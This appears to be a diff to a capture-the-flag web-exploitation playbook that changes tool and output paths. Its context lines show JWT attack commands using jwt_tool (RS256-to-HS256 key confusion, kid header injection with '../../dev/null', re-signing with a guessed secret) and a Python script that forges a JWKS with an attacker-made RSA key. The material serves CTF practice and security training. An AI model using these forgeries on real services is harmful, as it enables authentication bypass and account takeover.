@@ -33,7 +33,7 @@ Record the working endpoint, mechanism, and **all** user data returned (id, role
 
 JWT returned → decode and run the fast-track immediately:
 ```bash
-python3 ~/Tools/jwt_tool/jwt_tool.py <token>
+python3 /opt/security-tools/jwt_tool/jwt_tool.py <token>
 ```
 
 ## 2. JWT fast-track
@@ -127,9 +127,9 @@ concluding.
 ## 3. JWT deep-dive (only with a new primitive)
 
 ```bash
-python3 ~/Tools/jwt_tool/jwt_tool.py "$TOKEN" -X k -pk recon/pubkey.pem   # RS256→HS256 confusion
-python3 ~/Tools/jwt_tool/jwt_tool.py "$TOKEN" -I -hc kid -hv "../../dev/null"  # kid injection
-python3 ~/Tools/jwt_tool/jwt_tool.py "$TOKEN" -T -S hs256 -p "<secret>"
+python3 /opt/security-tools/jwt_tool/jwt_tool.py "$TOKEN" -X k -pk recon/pubkey.pem   # RS256→HS256 confusion
+python3 /opt/security-tools/jwt_tool/jwt_tool.py "$TOKEN" -I -hc kid -hv "../../dev/null"  # kid injection
+python3 /opt/security-tools/jwt_tool/jwt_tool.py "$TOKEN" -T -S hs256 -p "<secret>"
 ```
 
 ### JWKS substitution (requires upload write-traversal — see traversal-upload.md)
@@ -139,7 +139,7 @@ python3 << 'EOF'
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives import serialization
 import json, base64, os
-os.makedirs('~/Tools/CTF/<challenge-name>/exploits', exist_ok=True)
+os.makedirs('~/Offsec/Web_CTF/CTF/<challenge-name>/exploits', exist_ok=True)
 private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
 pub = private_key.public_key().public_numbers()
 def b64u(n):
@@ -147,10 +147,10 @@ def b64u(n):
     return base64.urlsafe_b64encode(n.to_bytes(l,'big')).rstrip(b'=').decode()
 kid = "pwned"
 jwks = {"keys":[{"kty":"RSA","use":"sig","alg":"RS256","kid":kid,"n":b64u(pub.n),"e":b64u(pub.e)}]}
-open('~/Tools/CTF/<challenge-name>/exploits/private_key.pem','wb').write(
+open('~/Offsec/Web_CTF/CTF/<challenge-name>/exploits/private_key.pem','wb').write(
     private_key.private_bytes(serialization.Encoding.PEM,
         serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
-json.dump(jwks, open('~/Tools/CTF/<challenge-name>/exploits/jwks.json','w'))
+json.dump(jwks, open('~/Offsec/Web_CTF/CTF/<challenge-name>/exploits/jwks.json','w'))
 print("Done. KID:", kid)
 EOF
 ```
